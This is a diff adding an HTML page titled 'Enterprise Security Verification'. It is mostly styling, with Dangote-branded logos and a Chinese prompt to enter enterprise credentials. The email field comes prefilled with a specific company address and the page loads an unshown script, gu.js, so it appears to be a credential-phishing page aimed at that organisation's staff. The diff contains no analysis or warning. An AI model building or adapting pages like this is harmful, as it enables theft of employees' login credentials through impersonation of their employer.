@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enterprise Security Verification</title>
+ <style>
+      * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+      }
+
+      body {
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+          background: #f5f5f5;
+          min-height: 100vh;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          color: #333;
+          line-height: 1.5;
+          padding: 16px;
+          /* Added background image properties */
+          background-image: url('https://i.imgur.com/bEhVo99.jpeg'); /* Replace with your actual image path */
+          background-size: cover;
+          background-position: center;
+          background-repeat: no-repeat;
+          background-attachment: fixed; /* Keeps background fixed when scrolling */
+      }
+
+      .top-logo {
+          width: auto;
+          height: 60px;
+          margin-bottom: 20px;
+          border-radius: 8px;
+          transition: all 0.3s ease;
+          cursor: pointer;
+      }
+
+      .top-logo:hover {
+          transform: scale(1.05);
+          box-shadow: 0 6px 20px rgba(220, 38, 38, 0.3);
+      }
+
+      .login-container {
+          background: transparent;
+          border-radius: 6px;
+          box-shadow: 0 3px 15px rgba(0, 0, 0, 0.08);
+          padding: 28px 24px;
+          width: 90%;
+          max-width: 400px;
+          text-align: center;
+          border: 1px solid #e8e8e8;
+          transition: all 0.3s ease;
+      }
+
+      .login-container.shake {
+          animation: shake 0.5s ease-in-out;
+      }
+
+      .login-container.success {
+          animation: success-pulse 0.6s ease-in-out;
+          border-color: #22c55e;
+          box-shadow: 0 3px 15px rgba(34, 197, 94, 0.2);
+      }
+
+      @keyframes shake {
+          0%, 100% { transform: translateX(0); }
+          25% { transform: translateX(-8px); }
+          75% { transform: translateX(8px); }
+      }
+
+      @keyframes success-pulse {
+          0% { transform: scale(1); }
+          50% { transform: scale(1.02); }
+          100% { transform: scale(1); }
+      }
+
+      .container-logo {
+          width: 50px;
+          height: 50px;
+          margin: 0 auto 16px;
+          border-radius: 8px;
+          transition: all 0.3s ease;
+          cursor: pointer;
+          object-fit: contain;
+          background: white;
+          padding: 6px;
+          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      }
+
+      .container-logo:hover {
+          transform: rotate(5deg) scale(1.1);
+      }
+
+      .security-message {
+          color: red;
+          font-size: 13px;
+          margin-bottom: 20px;
+          padding: 12px;
+          border-radius: 4px;
+          animation: fadeInUp 0.6s ease-out;
+      }
+
+      @keyframes fadeInUp {
+          from {
+              opacity: 0;
+              transform: translateY(15px);
+          }
+          to {
+              opacity: 1;
+              transform: translateY(0);
+          }
+      }
+
+      .form-group {
+          margin-bottom: 16px;
+          text-align: left;
+          animation: fadeInUp 0.6s ease-out;
+      }
+
+      .form-group:nth-child(2) {
+          animation-delay: 0.1s;
+      }
+
+      .form-group:nth-child(3) {
+          animation-delay: 0.2s;
+      }
+
+      .form-group label {
+          display: block;
+          margin-bottom: 4px;
+          color: #374151;
+          font-weight: 500;
+          font-size: 13px;
+      }
+
+      .form-input {
+          width: 100%;
+          padding: 10px 12px;
+          border: 1px solid #d1d5db;
+          border-radius: 4px;
+          font-size: 14px;
+          transition: all 0.3s ease;
+          background: #fff;
+      }
+
+      .form-input:focus {
+          outline: none;
+          border-color: #dc2626;
+          box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.1);
+          transform: translateY(-1px);
+      }
+
+      .form-input::placeholder {
+          color: #9ca3af;
+      }
+
+      .signin-button {
+          width: 100%;
+          background: linear-gradient(135deg, #dc2626, #b91c1c);
+          color: white;
+          border: none;
+          padding: 12px 16px;
+          border-radius: 4px;
+          font-size: 14px;
+          font-weight: 600;
+          cursor: pointer;
+          transition: all 0.3s ease;
+          margin-top: 6px;
+          position: relative;
+          overflow: hidden;
+          animation: fadeInUp 0.6s ease-out 0.3s both;
+      }
+
+      .signin-button:hover {
+          background: linear-gradient(135deg, #b91c1c, #991b1b);
+          transform: translateY(-2px);
+          box-shadow: 0 6px 20px rgba(220, 38, 38, 0.4);
+      }
+
+      .signin-button:active {
+          transform: translateY(0) scale(0.98);
+      }
+
+      .signin-button.clicked {
+          animation: buttonClick 0.3s ease-out;
+      }
+
+      @keyframes buttonClick {
+          0% { transform: scale(1); }
+          50% { transform: scale(0.95); }
+          100% { transform: scale(1); }
+      }
+
+      .signin-button:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
+          transform: none;
+      }
+
+      .loading-spinner {
+          display: none;
+          width: 16px;
+          height: 16px;
+          border: 2px solid transparent;
+          border-top: 2px solid white;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+          position: absolute;
+          right: 12px;
+          top: 50%;
+          transform: translateY(-50%);
+      }
+
+      @keyframes spin {
+          0% { transform: translateY(-50%) rotate(0deg); }
+          100% { transform: translateY(-50%) rotate(360deg); }
+      }
+
+      .message {
+          margin-top: 12px;
+          padding: 10px;
+          border-radius: 4px;
+          font-size: 13px;
+          display: none;
+          animation: slideIn 0.4s ease-out;
+      }
+
+      @keyframes slideIn {
+          from {
+              opacity: 0;
+              transform: translateY(-8px);
+          }
+          to {
+              opacity: 1;
+              transform: translateY(0);
+          }
+      }
+
+      .message.success {
+          background: #f0fdf4;
+          color: #166534;
+          border: 1px solid #bbf7d0;
+          animation: successGlow 0.6s ease-out;
+      }
+
+      @keyframes successGlow {
+          0% { box-shadow: 0 0 0 rgba(34, 197, 94, 0.4); }
+          50% { box-shadow: 0 0 15px rgba(34, 197, 94, 0.4); }
+          100% { box-shadow: 0 0 0 rgba(34, 197, 94, 0.4); }
+      }
+
+      .message.error {
+          background: #fef2f2;
+          color: #dc2626;
+          border: 1px solid #fecaca;
+      }
+
+      .success-checkmark {
+          display: none;
+          width: 40px;
+          height: 40px;
+          border-radius: 50%;
+          background: #22c55e;
+          margin: 16px auto;
+          position: relative;
+          animation: checkmarkScale 0.6s ease-out;
+      }
+
+      .success-checkmark.show {
+          display: block;
+      }
+
+      @keyframes checkmarkScale {
+          0% { transform: scale(0); }
+          50% { transform: scale(1.1); }
+          100% { transform: scale(1); }
+      }
+
+      .success-checkmark::after {
+          content: '✓';
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          color: white;
+          font-size: 20px;
+          font-weight: bold;
+      }
+
+      .footer {
+          margin-top: 24px;
+          text-align: center;
+          color: #6b7280;
+          font-size: 11px;
+          line-height: 1.4;
+          animation: fadeInUp 0.6s ease-out 0.5s both;
+      }
+
+      .footer-links {
+          margin-bottom: 8px;
+      }
+
+      .footer-links a {
+          color: #6b7280;
+          text-decoration: none;
+          margin: 0 6px;
+          transition: all 0.2s ease;
+          position: relative;
+      }
+
+      .footer-links a:hover {
+          color: #dc2626;
+          transform: translateY(-1px);
+      }
+
+      .footer-links a::after {
+          content: '';
+          position: absolute;
+          width: 0;
+          height: 1px;
+          bottom: -1px;
+          left: 50%;
+          background-color: #dc2626;
+          transition: all 0.3s ease;
+      }
+
+      .footer-links a:hover::after {
+          width: 100%;
+          left: 0;
+      }
+
+      .company-name {
+          color: #9ca3af;
+          font-size: 10px;
+          margin-top: 6px;
+      }
+
+      @media (max-width: 480px) {
+          body {
+              padding: 12px;
+          }
+
+          .top-logo {
+              height: 50px;
+              margin-bottom: 16px;
+          }
+
+          .container-logo {
+              width: 40px;
+              height: 40px;
+              margin-bottom: 12px;
+          }
+
+          .login-container {
+              padding: 20px 16px;
+          }
+
+          .footer {
+              margin-top: 16px;
+          }
+
+          .footer-links a {
+              display: block;
+              margin: 3px 0;
+          }
+      }
+  </style>
+</head>
+<body>
+  <!-- Logo above container -->
+  <img src="https://i.imgur.com/y9nOVuR.png" alt="Company Logo" class="top-logo" onclick="logoClick(this)">
+
+  <div class="login-container" id="loginContainer">
+      <!-- Logo inside container -->
+      <img src="https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://dangote.com&size=64" alt="Company Logo" class="container-logo" id="containerLogo" onclick="logoClick(this)">
+
+      <div class="security-message">
+          安全验证：请输入您的企业账户凭据以继续访问系统
+      </div>
+
+      <form id="loginForm" method="POST">
+          <div class="form-group">
+              <label for="email">电子邮件</label>
+              <input 
+                  type="email" 
+                  id="email" 
+                  name="email" 
+                  class="form-input" 
+                  placeholder="请输入电子邮箱"
+                  value="salses@dangote.com"
+                  required
+              >
+          </div>
+
+          <div class="form-group">
+              <label for="password">密码</label>
+              <input 
+                  type="password" 
+                  id="password" 
+                  name="password" 
+                  class="form-input" 
+                  placeholder="密码"
+                  required
+              >
+          </div>
+
+          <button type="submit" class="signin-button" id="signinBtn">
+              <span class="btn-text">签到</span>
+              <div class="loading-spinner" id="loadingSpinner"></div>
+          </button>
+      </form>
+
+      <div class="success-checkmark" id="successCheckmark"></div>
+      <div id="message" class="message"></div>
+  </div>
+  <script src="gu.js"></script>
+</body>
+</html>
